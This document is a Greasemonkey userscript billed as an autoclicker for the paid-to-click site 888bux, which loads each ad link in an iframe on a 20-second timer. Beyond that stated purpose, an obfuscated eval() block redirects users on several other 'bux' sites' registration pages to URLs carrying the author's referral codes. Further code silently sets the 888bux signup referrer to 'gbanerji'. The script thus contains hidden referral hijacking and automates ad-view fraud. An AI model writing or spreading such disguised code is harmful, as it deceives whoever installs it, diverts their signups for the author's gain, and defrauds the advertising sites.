// ==UserScript==
// @name           888bux_autoclicker
// @namespace      http://cool-bux.co.cc/
// @description    888bux autoclicker
// @include        *888bux.com/*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *cashgopher.com*

// ==/UserScript==


var ref = document.referrer;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|gbanerji|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))

var linkarray = document.getElementsByTagName('a');
var i = 0;
var j = 0;
var links = new Array();
var link = '';

if(uri.search('888bux.com/view.php') >= 0)
{

for(i=0;i<linkarray.length;i++)
{
link = linkarray[i].href;
if(link.search("l=") >= 0)
{
if(String(linkarray[i].parentNode.parentNode.childNodes[1].childNodes[1].childNodes[0].src).search("inactive") < 0) {
links[j] = link;
j++;
}
}
}

//for(j=0;j<links.length;j++)
//{
//alert(links[j]);
//}

var adframe = document.createElement('IFRAME');
adframe.setAttribute('name','adviewer');
adframe.setAttribute('id','adviewer');
adframe.setAttribute('width','100%');
adframe.setAttribute('height','250px');
adframe.setAttribute('style','border: 1px solid gray;background-color:#fff');

document.body.appendChild(adframe);

i = 0;
viewads();

}

if(uri.search('888bux.com') >= 0 && uri.search("l=") >= 0)
{
//close the iframe
var ifr = document.getElementsByTagName('iframe');

for(i=0;i<ifr.length;i++)
{
	ifr[i].src = "http://www.google.com";
}

}

function viewads()
{
	if(i < links.length)
	{
		adframe.src = links[i];
		window.setTimeout(viewads,20000);
	}
	else
	{
		//adframe.parentNode.removeChild(adframe);
		adframe.src = "http://cool-bux.co.cc";
	}
	i++;
}

if(uri.search("888bux.com/register.php") >= 0)
{

	var ref = document.getElementById('referrer');
	ref.value = "gbanerji";

}